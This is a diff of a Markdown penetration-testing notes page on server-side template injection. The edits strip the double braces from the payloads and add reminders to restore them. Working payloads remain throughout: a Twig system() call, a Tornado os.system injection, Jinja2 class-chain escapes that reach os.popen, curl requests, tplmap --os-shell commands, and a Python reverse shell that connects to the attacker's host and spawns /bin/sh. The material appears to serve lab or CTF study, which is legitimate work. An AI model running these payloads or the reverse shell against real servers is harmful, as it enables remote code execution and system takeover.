@@ -327,7 +327,7 @@ Host: ...:9000
 ```
 
 We can see It is using **wkhtmltopdf**. We can execute JavaScript on it. Let's use the following script:
-```JavaScript
+```javascript
 <html>
     <body>
         <b>Exfiltration via Blind SSRF</b>
@@ -499,8 +499,8 @@ if __name__ == "__main__":
     <title>Document</title>
 </head>
 <body>
-    <h1>{{title}}</h1>
-    <p>{{content}}</p>
+    <h1>{{<SOMETHING>}}</h1>
+    <p>{{<SOMETHING}}</p>
 </body>
 </html>
 ```
@@ -589,8 +589,11 @@ Twig has a variable `_self`, which makes a few of the internal APIs public. We c
 - Invoke `_self.env.getFilter()` to execute the function we have just registered
 
 ```php
-{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
+_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")
 ```
+
+> With double `{}` at the beginning and end 
+{: .prompt-info}
 
 Let's upload it:
 ```console
@@ -608,8 +611,8 @@ zero@pio$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell
 ## Tornado 
 
 Another type is [Tornado](https://www.tornadoweb.org/en/stable/).
-```console
-
+```python
+<BRACKET>% import os %<BRACKET><BRACKET><BRACKET>os.system('whoami')<BRACKET><BRACKET>
 ```
 
 **tqlmap** will gave us directly:
@@ -634,7 +637,7 @@ POST parameter: email
 
 ## Jinja2 
 
-After sending `{{7*'7'}}` and receaving `7777777` it means it's Jinja2.
+After sending `7*'7'` and receaving `7777777` it means it's Jinja2.
 ```console
 zero@pio$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'
 
@@ -776,22 +779,22 @@ RCE from a string object
 0
 ```
 
-Returning to the vulnerable application, send this payload `{{ ''.__class__ }}`:
+Returning to the vulnerable application, send this payload ` ''.__class__ `:
 ```console
 zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"
 ```
 
-With the following payload `{{ ''.__class__.__mro__ }}`:
+With the following payload ` ''.__class__.__mro__ `:
 ```console
 zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
 ```
 
-We are interested in the second item so `{{ ''.__class__.__mro__[1] }}`:
+We are interested in the second item so ` ''.__class__.__mro__[1] `:
 ```console
 zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
 ```
 
-Let us start walking down the hierarchy `{{ ''.__class__.__mro__[1].__subclasses__() }}`:
+Let us start walking down the hierarchy ` ''.__class__.__mro__[1].__subclasses__() `:
 ```console
 zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"
 ```
@@ -827,7 +830,7 @@ zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__
 
 This `0` means that the command got executed. We can identify if test1 was created using the following payload:
 ```python
-{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}
+''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()
 ```
 
 ```console
@@ -836,17 +839,20 @@ zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__
 
 We can also used `request` and `lipsum` to create the payload:
 ```python
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+request.application.__globals__.__builtins__.__import__('os').popen('id').read()
 ```
 
 ```python
-{{lipsum.__globals__.os.popen('id').read()}}
+lipsum.__globals__.os.popen('id').read()
 ```
 
 Now let's create the payload:
 ```python
-{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<OUR IP>",<OUR PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}
+''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<OUR IP>",<OUR PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()
 ```
+
+> ALL THE PYTHON PAYLOADS ARE BETWEEN DOUBLE `{}`
+{: .prompt-danger}
 
 ---
 
